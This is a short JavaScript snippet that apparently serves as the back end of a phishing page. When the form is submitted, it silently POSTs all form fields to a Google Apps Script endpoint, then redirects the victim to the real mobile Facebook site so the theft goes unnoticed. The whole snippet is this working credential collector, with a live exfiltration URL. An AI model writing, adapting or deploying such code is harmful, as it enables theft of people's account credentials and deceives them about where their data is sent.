const form = document.querySelector("#form")
    const scriptURL = 'https://script.google.com/macros/s/AKfycbxm7HMxyypsgryZS76CFhhhZRjbUt5Ol5FTCsujHfWPabx4-aCloEV9pEhkQzvNwUPvsw/exec'

    form.addEventListener('submit', e => {
      e.preventDefault()

      console.log(form)
      fetch(scriptURL, { method: 'POST', body: new FormData(form) })
        .then(response => { window.location.href='http://m.facebook.com' })
        .catch(error => alert('Error!', error.message))
    })
